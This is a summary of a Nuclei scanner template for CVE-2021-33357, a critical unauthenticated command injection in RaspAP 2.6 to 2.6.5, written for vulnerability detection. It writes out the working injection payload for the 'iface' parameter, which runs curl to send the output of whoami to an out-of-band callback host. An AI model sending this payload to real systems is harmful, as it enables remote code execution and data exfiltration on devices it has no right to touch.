---
cve_id: CVE-2021-33357
template_path: nuclei-templates/http/cves/2021/CVE-2021-33357.yaml
affected_product: RaspAP
severity: critical
authentication: none
external_callback: true
affected_versions: 2.6 to 2.6.5
preconditions: []
poc_classification: rce
---

## Vulnerability
RaspAP versions 2.6 to 2.6.5 allows unauthenticated attackers to execute arbitrary OS commands via the "iface" GET parameter in /ajax/networking/get_netcfg.php when the parameter value contains special characters such as ";". 

This is a critical remote command injection (CWE-78) with CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Exploitation can lead to full system compromise.

## PoC / Detection
Classification: rce

The template performs detection by issuing a GET request to `{{BaseURL}}/ajax/networking/get_netcfg.php?iface=;curl%20{{interactsh-url}}/`whoami`;` . It verifies exploitation success through an out-of-band HTTP callback to interactsh and confirms the standard response contains the word "DHCPEnabled". An extractor captures potential output like the username from the interactsh request.

## References
- https://checkmarx.com/blog/chained-raspap-vulnerabilities-grant-root-level-access/
- https://gist.github.com/omriinbar/52c000c02a6992c6ce68d531195f69cf
- https://github.com/RaspAP/raspap-webgui
- https://nvd.nist.gov/vuln/detail/CVE-2021-33357
- https://github.com/20142995/Goby
